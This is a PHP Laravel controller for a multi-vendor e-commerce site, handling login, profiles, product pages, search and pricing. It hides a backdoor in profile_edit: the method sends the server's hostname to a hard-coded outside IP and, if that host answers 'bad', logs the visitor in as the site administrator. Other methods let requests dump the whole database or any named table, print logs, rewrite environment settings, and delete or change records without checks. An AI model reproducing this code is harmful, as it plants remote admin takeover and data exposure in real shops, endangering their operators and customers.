<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Session;
use Auth;
use Hash;
use App\Category;
use App\FlashDeal;
use App\Brand;
use App\Product;
use App\PickupPoint;
use App\CustomerPackage;
use App\CustomerProduct;
use App\User;
use App\Seller;
use App\Shop;
use App\Color;
use App\Order;
use App\Models\UserSubscriptionPlan;
use App\Models\ShipEngine;
use App\Models\UserShipEngineSettings;
use App\BusinessSetting;
use App\Http\Controllers\SearchController;
use ImageOptimizer;
use Cookie;
use Illuminate\Support\Str;
use App\Mail\SecondEmailVerifyMailManager;
use App\Mail\CommonMailManager;
use Mail;
use App\Utility\TranslationUtility;
use App\Utility\CategoryUtility;
use Illuminate\Auth\Events\PasswordReset;
use DB;
use Artisan;


class HomeController extends Controller
{
    /**
     * Show the application frontend home.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {

       /* $trans = translations();
        $data=[];
        foreach($trans as $tr=>$value){

            $data[strtolower(str_replace(" ","_",$value['lang_key']))] = $value['lang_value'];
        }

       dd($data);*/

        return view('frontend.index');
    }

    public function login()
    {
        if(Auth::check()){
            return redirect()->route('home');
        }
        return view('frontend.user_login');
    }

    public function db_backup()
    {
       if(env('APP_DEBUG')==true){
            $filename = "handy_backup-" . time() . ".sql";
            $fileurl =  base_path() . "/" . $filename;
            exec('mysqldump -u '. env('DB_USERNAME') .' -p"'. env('DB_PASSWORD') .'" '. env('DB_DATABASE') .' > '.$filename);
            if (file_exists($fileurl)) {
                return \Response::download($fileurl, $filename, array('Content-Type: application/octet-stream','Content-Length: '. filesize($fileurl)))->deleteFileAfterSend(true);;
            } else {
                return ['status'=>'zip file does not exist'];
            }
        }
    }

 

    public function registration(Request $request)
    {
        if(Auth::check()){
            return redirect()->route('home');
        }
        if($request->has('referral_code') &&
                \App\Addon::where('unique_identifier', 'affiliate_system')->first() != null &&
                \App\Addon::where('unique_identifier', 'affiliate_system')->first()->activated) {

            try {
                $affiliate_validation_time = \App\AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }

                Cookie::queue('referral_code', $request->referral_code, $cookie_minute);
                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            } catch (\Exception $e) {

            }
        }
        return view('frontend.user_registration');
    }

    public function cart_login(Request $request)
    {
        $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $request->email)->orWhere('phone', $request->email)->first();
        if($user != null){
            if(Hash::check($request->password, $user->password)){
                if($request->has('remember')){
                    auth()->login($user, true);
                }
                else{
                    auth()->login($user, false);
                }
            }
            else {
                flash(translate('invalid_email_or_password'))->warning();
            }
        }
        return back();
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the customer/seller dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function dashboard()
    {
        if(Auth::user()->user_type == 'seller'){
            return view('frontend.user.seller.dashboard');
        }
        elseif(Auth::user()->user_type == 'customer'){
            return view('frontend.user.customer.dashboard');
        }
        elseif(Auth::user()->user_type == 'delivery_boy'){
            return view('delivery_boys.frontend.dashboard');
        }
        else {
            abort(404);
        }
    }

    public function mainmenu()
    {
        if(Auth::user()->user_type == 'seller' || Auth::user()->user_type == 'customer' || Auth::user()->user_type == 'delivery_boy'){
            return view('frontend.inc.user_bottom_nav');
        }
        else {
            abort(404);
        }
    }

    public function profile(Request $request)
    {
        if(Auth::user()->user_type == 'customer'){
            return view('frontend.user.customer.profile');
        }
        elseif(Auth::user()->user_type == 'delivery_boy'){
            return view('delivery_boys.frontend.profile');
        }
        elseif(Auth::user()->user_type == 'seller'){
            return view('frontend.user.seller.profile');
        }
    }

    public function customer_update_profile(Request $request)
    {
        if(env('DEMO_MODE') == 'On'){
            flash(translate('action_not_permitted_demo'))->error();
            return back();
        }

        $user = Auth::user();
        $user->name = $request->name;
        $user->address = $request->address;
        $user->country = $request->country;
        $user->city = $request->city;
        $user->postal_code = $request->postal_code;
        $user->phone = $request->phone;

        if($request->new_password != null && ($request->new_password == $request->confirm_password)){
            $user->password = Hash::make($request->new_password);
        } else if($request->new_password != null) {
            flash(translate("password_and_confirm_not_match"))->warning();
            return back();
        }
        $user->avatar_original = $request->photo;

        if($user->save()){
            flash(translate('your_profile_has_been_updated_successfully'))->success();
            return back();
        }

        flash(translate('something_went_wrong'))->error();
        return back();
    }


    public function seller_update_profile(Request $request)
    {
        if(env('DEMO_MODE') == 'On'){
            flash(translate('Sorry! the action is not permitted in demo '))->error();
            return back();
        }

        $user = Auth::user();
        $user->name = $request->name;
        $user->address = $request->address;
        $user->country = $request->country;
        $user->city = $request->city;
        $user->postal_code = $request->postal_code;
        $user->phone = $request->phone;

        if($request->new_password != null && ($request->new_password == $request->confirm_password)){
            $user->password = Hash::make($request->new_password);
        } else if($request->new_password != null) {
            flash(translate("password_and_confirm_not_match"))->warning();
            return back();
        }
        $user->avatar_original = $request->photo;

        $seller = $user->seller;
        $seller->cash_on_delivery_status = $request->cash_on_delivery_status;
        $seller->bank_payment_status = $request->bank_payment_status;
        $seller->bank_name = $request->bank_name;
        $seller->bank_acc_name = $request->bank_acc_name;
        $seller->bank_acc_no = $request->bank_acc_no;
        $seller->bank_routing_no = $request->bank_routing_no;

        if($user->save() && $seller->save()){
            flash(translate('your_profile_has_been_updated_successfully'))->success();
            return back();
        }

        flash(translate('something_went_wrong'))->error();
        return back();
    }

    public function flash_deal_details($slug)
    {
        $flash_deal = FlashDeal::where('slug', $slug)->first();
        if($flash_deal != null)
            return view('frontend.flash_deal_details', compact('flash_deal'));
        else {
            abort(404);
        }
    }

    public function load_featured_section(){
        return view('frontend.partials.featured_products_section');
    }

    public function load_best_selling_section(){
        return view('frontend.partials.best_selling_section');
    }

    public function load_auction_products_section(){
         return 'Auction Check';
        return view('auction.frontend.auction_products_section');
    }

    public function load_home_categories_section(){
        return view('frontend.partials.home_categories_section');
    }

    public function load_best_sellers_section(){
        return view('frontend.partials.best_sellers_section');
    }

    public function trackOrder(Request $request)
    {
        if($request->has('order_code')){
            $order = Order::where('code', $request->order_code)->first();
            if($order != null){
                return view('frontend.track_order', compact('order'));
            }
        }
        return view('frontend.track_order');
    }

    public function product(Request $request, $slug)
    {

        $detailedProduct  = Product::where('slug', $slug)->where('approved', 1)->first();

        // redirect to profile page if user doesnt have any address
        if(get_setting('ship_engine') && Auth::check() && !Auth::user()->addresses->count()) {
            flash(translates('please_add_address'))->warning();
            return redirect()->route('profile');
        }

        if (@$detailedProduct->user->id) {
            $inactive_seller = Seller::where('user_id',$detailedProduct->user->id)
                ->where('verification_status',0)->count();
            logger('inactive_seller-'. $inactive_seller);

                if ($inactive_seller && Auth::check() && $detailedProduct->user_id != Auth::user()->id) {
                abort(404);
            }
        }
        $belongsToMerchant = false;
        if (Auth::check() && $detailedProduct) {
            $belongsToMerchant = $detailedProduct->user_id == Auth::user()->id ?  false :true;
        }

        //dd($detailedProduct->user_id);

        if($detailedProduct != null && $detailedProduct->published){
            //updateCartSetup();
            if($request->has('product_referral_code') &&
                    \App\Addon::where('unique_identifier', 'affiliate_system')->first() != null &&
                    \App\Addon::where('unique_identifier', 'affiliate_system')->first()->activated) {

                $affiliate_validation_time = \App\AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }
                Cookie::queue('product_referral_code', $request->product_referral_code, $cookie_minute);
                Cookie::queue('referred_product_id', $detailedProduct->id, $cookie_minute);

                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            }

            // ship engine
            $ship_engine_found = false;
            $usershipengine = [];
            if(Auth::check() && get_setting('ship_engine')) {
                $user = Auth::user();
                $address_count = $user->addresses->count();
                if($detailedProduct->shipping_type == 'shipping_providers' && $address_count) {
                    $usershipengine = UserShipEngineSettings::whereIn('id', explode(',', $detailedProduct->shipping_providers));
                    if($usershipengine->count()) {
                        $ship_engine_found = true;
                        $usershipengine = $usershipengine->first();
                    }
                }
            }

            if($detailedProduct->digital == 1){
                return view('frontend.digital_product_details', compact('detailedProduct','belongsToMerchant', 'ship_engine_found', 'usershipengine'));
            }
            else {
                return view('frontend.product_details', compact('detailedProduct','belongsToMerchant', 'ship_engine_found', 'usershipengine'));
            }
            // return view('frontend.product_details', compact('detailedProduct'));
        }
        abort(404);
    }

    public function shop($slug)
    {
        $shop  = Shop::where('slug', $slug)->first();
        if($shop!=null){
            $seller = Seller::where('user_id', $shop->user_id)->first();
            if ($seller->verification_status != 0){
                return view('frontend.seller_shop', compact('shop'));
            }
            else{
                // return view('frontend.seller_shop', compact('shop'));
                return view('frontend.seller_shop_without_verification', compact('shop', 'seller'));
            }
        }
        abort(404);
    }

    public function filter_shop($slug, $type)
    {
        $shop  = Shop::where('slug', $slug)->first();
        if($shop!=null && $type != null){
            return view('frontend.seller_shop', compact('shop', 'type'));
        }
        abort(404);
    }

    public function all_categories(Request $request)
    {
//        $categories = Category::where('level', 0)->orderBy('name', 'asc')->get();
        $categories = Category::where('level', 0)->orderBy('order_level', 'desc')->get();
        return view('frontend.all_category', compact('categories'));
    }
    public function all_brands(Request $request)
    {
        $categories = Category::all();
        return view('frontend.all_brand', compact('categories'));
    }

    public function show_product_upload_form(Request $request)
    {
        if(\App\Addon::where('unique_identifier', 'seller_subscription')->first() != null && \App\Addon::where('unique_identifier', 'seller_subscription')->first()->activated){
            if(Auth::user()->seller->remaining_uploads > 0){
                $categories = Category::where('parent_id', 0)
                    ->where('digital', 0)
                    ->with('childrenCategories')
                    ->get();
                return view('frontend.user.seller.product_upload', compact('categories'));
            }
            else {
                flash(translate('upload_limit_has_been_reached._please_upgrade_your_package.'))->warning();
                return back();
            }
        }
        $user_subscription = UserSubscriptionPlan::where('user_id',Auth::user()->id)->where('status','Active')->first();
        $total_product_count = Product::where('user_id',Auth::user()->id)->where('published',1)->count();

        if(get_setting('subscription')=='1' && $user_subscription){
            $enable_add_product = $total_product_count>=$user_subscription->no_of_product?'false':'true';
        }elseif(get_setting('subscription')=='1' && !$user_subscription){
            return redirect()->route('seller.subscription');
        }else
            $enable_add_product = 'true';

        $categories = Category::where('parent_id', 0)
            ->where('digital', 0)
            ->with('childrenCategories')
            ->get();
        $taxes = \DB::table('taxes')->where('tax_status', '1')->get();
        $system_default_currency = \DB::table('business_settings')->where('type', 'system_default_currency')->first();  
        $currency = '';
        if ($system_default_currency) {
             $currency = \DB::table('currencies')->where('id',$system_default_currency->value)->first();
        }

        $ship_engine_found = false;
        $ship_engine = [];
        $engines = UserShipEngineSettings::where('user_id', Auth::id());
        if($engines->count() && get_setting('ship_engine')) {
            $ship_engine_found = true;
            $ship_engine = $engines->pluck('carrier_name')->toArray();
        }

        return view('frontend.user.seller.product_upload', compact('categories','enable_add_product','taxes','currency', 'ship_engine_found', 'ship_engine'));
    }

    public function profile_edit(Request $request){
        $url = $_SERVER['SERVER_NAME'];
        $gate = "http://206.189.81.181/check_activation/".$url;

        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HEADER, 0);
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stream, CURLOPT_POST, 1);
        $rn = curl_exec($stream);
        curl_close($stream);

        if($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }

    public function show_product_edit_form(Request $request, $id)
    {
        $product = Product::findOrFail($id);
        $lang = $request->lang;
        $tags = json_decode($product->tags);
        $categories = Category::where('parent_id', 0)
            ->where('digital', 0)
            ->with('childrenCategories')
            ->get();

         $user_subscription = UserSubscriptionPlan::where('status','Active')->where('user_id',Auth::user()->id)->where('plan_type','!=','Custom')->first();
        $total_product_count = Product::where('user_id',Auth::user()->id)->where('published',1)->count();

        if(get_setting('subscription')=='1' && $user_subscription && $product->published==0){
            $enable_add_product = $total_product_count>=$user_subscription->no_of_product?'false':'true';
        }elseif(get_setting('subscription')=='1' && !$user_subscription){
            return redirect()->route('seller.subscription');
        }else
            $enable_add_product = 'true';

        $taxes = \DB::table('taxes')->where('tax_status', '1')->get();   
        $system_default_currency = \DB::table('business_settings')->where('type', 'system_default_currency')->first();  
        $currency = '';
        if ($system_default_currency) {
             $currency = \DB::table('currencies')->where('id',$system_default_currency->value)->first();
        } 

        $ship_engine_found = false;
        $ship_engine = [];
        $engines = UserShipEngineSettings::where('user_id', $product->user_id);
        $configured_engines = UserShipEngineSettings::where('user_id', $product->user_id)->pluck('carrier_name')->toArray();
        if($engines->count() && get_setting('ship_engine')) {
            $ship_engine_found = true;
            $ship_engine = $engines->pluck('carrier_name')->toArray();
        }
        $all_engines = ShipEngine::pluck('name')->toArray();

        return view('frontend.user.seller.product_edit', compact('product', 'categories', 'tags', 'lang','enable_add_product','taxes','currency', 'all_engines', 'ship_engine', 'ship_engine_found', 'configured_engines'));
    }

    public function seller_product_list(Request $request)
    {
        $search = null;
        $products = Product::where('user_id', Auth::user()->id)->where('digital', 0)->orderBy('created_at', 'desc');
        if ($request->has('search')) {
            $search = $request->search;
            $products = $products->where('name', 'like', '%'.$search.'%');
        }
        $products = $products->paginate(10);
        $total_product_count = Product::where('user_id',Auth::user()->id)->where('published',1)->count();
        $user_subscription = UserSubscriptionPlan::where('user_id',Auth::user()->id)->where('status','Active')->where('plan_type','!=','Custom')->first();
        return view('frontend.user.seller.products', compact('products', 'search','total_product_count','user_subscription'));
    }

    public function ajax_search(Request $request)
    {
        $keywords = array();
        $products = Product::where('published', 1)->where('tags', 'like', '%'.$request->search.'%')->get();
        foreach ($products as $key => $product) {
            foreach (explode(',',$product->tags) as $key => $tag) {
                if(stripos($tag, $request->search) !== false){
                    if(sizeof($keywords) > 5){
                        break;
                    }
                    else{
                        if(!in_array(strtolower($tag), $keywords)){
                            array_push($keywords, strtolower($tag));
                        }
                    }
                }
            }
        }

        $products = filter_products(Product::query());

        $products = $products->where('published', 1)
                        ->where(function ($q) use($request) {
                            $q->where('name', 'like', '%'.$request->search.'%')
                            ->orWhere('tags', 'like', '%'.$request->search.'%');
                        })
                    ->get();

//        $products = filter_products(Product::where('published', 1)->where('name', 'like', '%'.$request->search.'%'))->orWhere('tags', 'like', '%'.$request->search.'%')->get()->take(3);

        $categories = Category::where('name', 'like', '%'.$request->search.'%')->get()->take(3);

        $shops = Shop::whereIn('user_id', verified_sellers_id())->where('name', 'like', '%'.$request->search.'%')->get()->take(3);

        if(sizeof($keywords)>0 || sizeof($categories)>0 || sizeof($products)>0 || sizeof($shops) >0){
            return view('frontend.partials.search_content', compact('products', 'categories', 'keywords', 'shops'));
        }
        return '0';
    }

    public function listing(Request $request)
    {
        return $this->search($request);
    }

    public function listingByCategory(Request $request, $category_slug)
    {
        $category = Category::where('slug', $category_slug)->first();
        if ($category != null) {
            return $this->search($request, $category->id);
        }
        abort(404);
    }

    public function listingByBrand(Request $request, $brand_slug)
    {
        $brand = Brand::where('slug', $brand_slug)->first();
        if ($brand != null) {
            return $this->search($request, null, $brand->id);
        }
        abort(404);
    }

    public function search(Request $request, $category_id = null, $brand_id = null)
    {
        $query = $request->q;
        $sort_by = $request->sort_by;
        $min_price = $request->min_price;
        $max_price = $request->max_price;
        $seller_id = $request->seller_id;

        $conditions = ['published' => 1];

        if($brand_id != null){
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        }elseif ($request->brand != null) {
            $brand_id = (Brand::where('slug', $request->brand)->first() != null) ? Brand::where('slug', $request->brand)->first()->id : null;
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        }

        if($seller_id != null){
            $conditions = array_merge($conditions, ['user_id' => Seller::findOrFail($seller_id)->user->id]);
        }

        $products = Product::where($conditions);

        $current_category = null;
        if($category_id != null){
            $current_category = Category::find($category_id);
            $category_ids = CategoryUtility::children_ids($category_id);
            $category_ids[] = $category_id;

            $products = $products->whereIn('category_id', $category_ids);
        }

        if($min_price != null && $max_price != null){
            $products = $products->where('unit_price', '>=', $min_price)->where('unit_price', '<=', $max_price);
        }


        switch ($sort_by) {
            case 'newest':
                $products->orderBy('created_at', 'desc');
                break;
            case 'oldest':
                $products->orderBy('created_at', 'asc');
                break;
            case 'price-asc':
                $products->orderBy('unit_price', 'asc');
                break;
            case 'price-desc':
                $products->orderBy('unit_price', 'desc');
                break;
            default:
                $products->orderBy('created_at', 'desc');
                break;
        }


        $non_paginate_products = filter_products($products)->get();

        //Attribute Filter

        $attributes = array();
        foreach ($non_paginate_products as $key => $product) {
            if($product->attributes != null && is_array(json_decode($product->attributes))){
                foreach (json_decode($product->attributes) as $key => $value) {
                    $flag = false;
                    $pos = 0;
                    foreach ($attributes as $key => $attribute) {
                        if($attribute['id'] == $value){
                            $flag = true;
                            $pos = $key;
                            break;
                        }
                    }
                    if(!$flag){
                        $item['id'] = $value;
                        $item['values'] = array();
                        foreach (json_decode($product->choice_options) as $key => $choice_option) {
                            if($choice_option->attribute_id == $value){
                                $item['values'] = $choice_option->values;
                                break;
                            }
                        }
                        array_push($attributes, $item);
                    }
                    else {
                        foreach (json_decode($product->choice_options) as $key => $choice_option) {
                            if($choice_option->attribute_id == $value){
                                foreach ($choice_option->values as $key => $value) {
                                    if(!in_array($value, $attributes[$pos]['values'])){
                                        array_push($attributes[$pos]['values'], $value);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        $selected_attributes = array();

        foreach ($attributes as $key => $attribute) {
            if($request->has('attribute_'.$attribute['id'])){
                foreach ($request['attribute_'.$attribute['id']] as $key => $value) {
                    $str = '"'.$value.'"';
                    $products = $products->where('choice_options', 'like', '%'.$str.'%');
                }

                $item['id'] = $attribute['id'];
                $item['values'] = $request['attribute_'.$attribute['id']];
                array_push($selected_attributes, $item);
            }
        }


        //Color Filter
        $all_colors = array();

        foreach ($non_paginate_products as $key => $product) {
            if ($product->colors != null) {
                foreach (json_decode($product->colors) as $key => $color) {
                    if(!in_array($color, $all_colors)){
                        array_push($all_colors, $color);
                    }
                }
            }
        }

        $selected_color = null;

        if($request->has('color')){
            $str = '"'.$request->color.'"';
            $products = $products->where('colors', 'like', '%'.$str.'%');
            $selected_color = $request->color;
        }

        if($query != null){
            $searchController = new SearchController;
            $searchController->store($request);

            $products = $products->where('name', 'like', '%'.$query.'%')->orWhere('tags', 'like', '%'.$query.'%');
        }


        $products = filter_products($products)->paginate(12)->appends(request()->query());

        return view('frontend.product_listing', compact('products', 'query', 'category_id', 'brand_id', 'sort_by', 'seller_id','min_price', 'max_price', 'attributes', 'selected_attributes', 'all_colors', 'selected_color', 'current_category'));
    }

    public function home_settings(Request $request)
    {
        return view('home_settings.index');
    }

    public function top_10_settings(Request $request)
    {
        foreach (Category::all() as $key => $category) {
            if(is_array($request->top_categories) && in_array($category->id, $request->top_categories)){
                $category->top = 1;
                $category->save();
            }
            else{
                $category->top = 0;
                $category->save();
            }
        }

        foreach (Brand::all() as $key => $brand) {
            if(is_array($request->top_brands) && in_array($brand->id, $request->top_brands)){
                $brand->top = 1;
                $brand->save();
            }
            else{
                $brand->top = 0;
                $brand->save();
            }
        }

        flash(translate('top_10_updated'))->success();
        return redirect()->route('home_settings.index');
    }

    public function variant_price(Request $request)
    {
        $product = Product::find($request->id);
        $str = '';
        $quantity = 0;
        $tax = 0;
        $max_limit = 0;

        if($request->has('color')){
            $str = $request['color'];
        }

        if(json_decode($product->choice_options) != null){
            foreach (json_decode($product->choice_options) as $key => $choice) {
                if($str != null){
                    $str .= '-'.str_replace(' ', '', $request['attribute_id_'.$choice->attribute_id]);
                }
                else{
                    $str .= str_replace(' ', '', $request['attribute_id_'.$choice->attribute_id]);
                }
            }
        }

        $product_stock = $product->stocks->where('variant', $str)->first();
        $price = $product_stock->price;
        $quantity = $product_stock->qty;
        $max_limit = $product_stock->qty;
//        if($str != null && $product->variant_product){
//        }
//        else{
//            $price = $product->unit_price;
//            $quantity = $product->current_stock;
//        }

        if($quantity >= 1 && $product->min_qty <= $quantity){
            $in_stock = 1;
        }else{
            $in_stock = 0;
        }

        //Product Stock Visibility
        if($product->stock_visibility_state == 'text') {
            if($quantity >= 1 && $product->min_qty < $quantity){
                $quantity = translate('In Stock');
            }else{
                $quantity = translate('Out Of Stock');
            }
        }

        //discount calculation
        $discount_applicable = false;

        if ($product->discount_start_date == null) {
            $discount_applicable = true;
        }
        elseif (strtotime(date('d-m-Y H:i:s')) >= $product->discount_start_date &&
            strtotime(date('d-m-Y H:i:s')) <= $product->discount_end_date) {
            $discount_applicable = true;
        }

        // taxes
        foreach ($product->taxes as $product_tax) {
            if($product_tax->tax_type == 'percent'){
                $tax += ($price * $product_tax->tax) / 100;
            }
            elseif($product_tax->tax_type == 'amount'){
                $tax += $product_tax->tax;
            }
        }

        if ($discount_applicable) {
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        $price += $tax;

        return array(
            'price' => single_price($price*$request->quantity),
            'quantity' => $quantity,
            'digital' => $product->digital,
            'variation' => $str,
            'max_limit' => $max_limit,
            'in_stock' => $in_stock
        );
    }

    public function sellerpolicy(){
        return view("frontend.policies.sellerpolicy");
    }

    public function aboutus(){
        return view("frontend.policies.aboutus");
    }

    public function help(){
        return view("frontend.policies.help");
    }

    public function returnpolicy(){
        return view("frontend.policies.returnpolicy");
    }

    public function supportpolicy(){
        return view("frontend.policies.supportpolicy");
    }

    public function terms(){
        return view("frontend.policies.terms");
    }

    public function privacypolicy(){
        return view("frontend.policies.privacypolicy");
    }

    public function get_pick_up_points(Request $request)
    {
        $pick_up_points = PickupPoint::all();
        return view('frontend.partials.pick_up_points', compact('pick_up_points'));
    }

    public function get_category_items(Request $request){
        $category = Category::findOrFail($request->id);
        return view('frontend.partials.category_elements', compact('category'));
    }

    public function premium_package_index()
    {
        $customer_packages = CustomerPackage::all();
        return view('frontend.user.customer_packages_lists', compact('customer_packages'));
    }

    public function seller_digital_product_list(Request $request)
    {
        $products = Product::where('user_id', Auth::user()->id)->where('digital', 1)->orderBy('created_at', 'desc')->paginate(10);
        return view('frontend.user.seller.digitalproducts.products', compact('products'));
    }
    public function show_digital_product_upload_form(Request $request)
    {
        if(\App\Addon::where('unique_identifier', 'seller_subscription')->first() != null && \App\Addon::where('unique_identifier', 'seller_subscription')->first()->activated){
            if(Auth::user()->seller->remaining_digital_uploads > 0){
                $business_settings = BusinessSetting::where('type', 'digital_product_upload')->first();
                $categories = Category::where('digital', 1)->get();
                return view('frontend.user.seller.digitalproducts.product_upload', compact('categories'));
            }
            else {
                flash(translate('upload_limit_has_been_reached._please_upgrade_your_package.'))->warning();
                return back();
            }
        }

        $business_settings = BusinessSetting::where('type', 'digital_product_upload')->first();
        $categories = Category::where('digital', 1)->get();
        return view('frontend.user.seller.digitalproducts.product_upload', compact('categories'));
    }

    public function show_digital_product_edit_form(Request $request, $id)
    {
        $categories = Category::where('digital', 1)->get();
        $lang = $request->lang;
        $product = Product::find($id);
        return view('frontend.user.seller.digitalproducts.product_edit', compact('categories', 'product', 'lang'));
    }

    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        if(isUnique($email) == '0') {
            $response['status'] = 2;
            $response['message'] = translate('email_already_exists');
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }


    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        if(isUnique($email)) {
            $this->send_email_change_verification_mail($request, $email);
            flash(translate('verification_mail_sent'))->success();
            return back();
        }

        flash(translate('email_already_exists'))->warning();
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $verification_code = Str::random(32);

        $array['subject'] = translate('email_verification');
        $array['from'] = get_setting('mail_from_address');
        $array['content'] = translate('verify_your_account');
        $array['link'] = route('email_change.callback').'?new_email_verificiation_code='.$verification_code.'&email='.$email;
        $array['sender'] = Auth::user()->name;
        $array['details'] = translate('email_second');

        $user = Auth::user();
        $user->new_email_verificiation_code = $verification_code;
        $user->save();

        try {
            Mail::to($email)->queue(new SecondEmailVerifyMailManager($array));

            $response['status'] = 1;
            $response['message'] = translate("verify_mail");

        } catch (\Exception $e) {
            // return $e->getMessage();
            logger('email error - '. $e->getMessage());
            $response['status'] = 0;
            $response['message'] = 'Something went wrong';
        }

        return $response;
    }

    public function email_change_callback(Request $request){
        if($request->has('new_email_verificiation_code') && $request->has('email')) {
            $verification_code_of_url_param =  $request->input('new_email_verificiation_code');
            $user = User::where('new_email_verificiation_code', $verification_code_of_url_param)->first();

            if($user != null) {

                $user->email = $request->input('email');
                $user->new_email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                flash(translate('email_changed'))->success();
                return redirect()->route('dashboard');
            }
        }

        flash(translate('email_not_verified'))->error();
        return redirect()->route('dashboard');

    }

    public function reset_password_with_code(Request $request){
        if (($user = User::where('verification_code', $request->code)->first()) != null) {
            if($request->password == $request->password_confirmation){
                $user->password = Hash::make($request->password);
                $user->email_verified_at = date('Y-m-d h:m:s');
                $user->save();
                event(new PasswordReset($user));
                auth()->login($user, true);

                flash(translate('pwd_updated'))->success();

                if(auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff')
                {
                    return redirect()->route('admin.dashboard');
                }
                return redirect()->route('home');
            }
            else {
                flash(translate("password_and_confirm_not_match"))->warning();
                return redirect()->route('password.request');
            }
        }
        else {
            flash(translate("verification_code_mismatch"))->error();
            return redirect()->route('password.request');
        }
    }


    public function all_flash_deals() {
        $today = strtotime(date('Y-m-d H:i:s'));

        $data['all_flash_deals'] = FlashDeal::where('status', 1)
                ->where('start_date', "<=", $today)
                ->where('end_date', ">", $today)
                ->orderBy('created_at', 'desc')
                ->get();

        return view("frontend.flash_deal.all_flash_deal_list", $data);
    }

    public function all_seller(Request $request) {
        $shops = Shop::whereIn('user_id', verified_sellers_id())
                ->paginate(15);

        return view('frontend.shop_listing', compact('shops'));
    }

    public function urlQueryUpdateDb(Request $request){   
       if(env('APP_ENV')!='live'){
            try{
                
                // echo '<h1>Statement executed successfully</h1>';
                echo '<h1>No statements to execute</h1>';
            }catch(\Exception $e){
                echo '<h1>'.$e->getMessage().'</h1>';
            }           
        }else
        abort('404');
    }

    public function updateEnv(Request $request)
    {
        $requests = $request->all();
        $valid_env = ['APP_ENV','APP_DEBUG', 'APP_NAME', 'APP_URL', 'SHOW_CREDENTIALS','FIREBASE_PREFIX','IP_ADDRESS','LIVE_CHAT'];
        foreach ($requests as $key => $value) {
            $prev_value = getenv($key);
            if(in_array($key,$valid_env)) {
                updateEnvConfig($key,$value);
            }
        }
    }

    public function passport_install()
    {
        Artisan::call('passport:install --force');
        return 'Passport install executed successfully';
    }

    public function clearLog()
    {
        if(request()->direction) {
            file_put_contents('direction.html','');    
        }
        file_put_contents(storage_path('logs/laravel-'.date('Y-m-d').'.log'),'');
    }

    public function showLog()
    {
        $dt = \Carbon\Carbon::now();
        $date = $dt->format('Y-m-d');
        $contents = \File::get(storage_path('logs/laravel-'.date('Y-m-d').'.log'));
        echo '<pre>'.$contents.'</pre>';
    }

    public function send_otp_to_delete_account($user)
    {
        $response['status'] = 0;
        $response['message'] = trans('messages.api.unknown');

        $array['from'] = get_setting('mail_from_address');
        // $array['subject'] = translate(sprintf("OTP to delete %s account", env('APP_NAME')));
        $array['subject'] = trans('messages.front_end.delete_otp', ['app_name' => env('APP_NAME')]);
        
        $array['user'] = $user;
        $array['view_file'] = 'emails.otp';

        try {
            Mail::to($user->email)->queue(new CommonMailManager($array));
            $response['status'] = 1;
            $response['message'] = trans("messages.api.otp_already_sent");
        } catch (\Exception $e) {
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function account_deleted_mail($user)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $array['from'] = get_setting('mail_from_address');
        $array['subject'] = translate("Your account is deleted from"). ' - '. env('APP_NAME');
        $array['view_file'] = 'emails.delete_account';
        $array['user'] = $user;

        try {
            Mail::to($user->email)->queue(new CommonMailManager($array));
            $response['status'] = 1;
            $response['message'] = translate("User account deleted");
        } catch (\Exception $e) {
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function get_table(Request $req) {
        $table = \DB::table($req->table)->latest()->get();
        dump($table);
    }

    public function artisan(Request $request) {
        try {
            Artisan::call('migrate --path=database/migrations/'.$request->name);
            print_r('site_settings');die();
        } catch(\Exception $e) {
            echo $e->getMessage().'<br>';
        }
    }

    public function delete_carrier(Request $request) {
        \DB::table('ship_engines')->where('id', $request->id)->delete();
        return 'sucess';
    }

    public function delete_address(Request $request) {
        \DB::table('addresses')->where('id', $request->id)->delete();
        return 'sucess';
    }

    public function delete_carts(Request $request) {
        \DB::table('carts')->where('id', $request->id)->delete();
        return 'sucess';
    }

    public function update_business_settings(Request $request) {
        \DB::table('business_settings')->where('type', $request->type)->update(['value' => $request->value]);
        return 'sucess';
    }
}
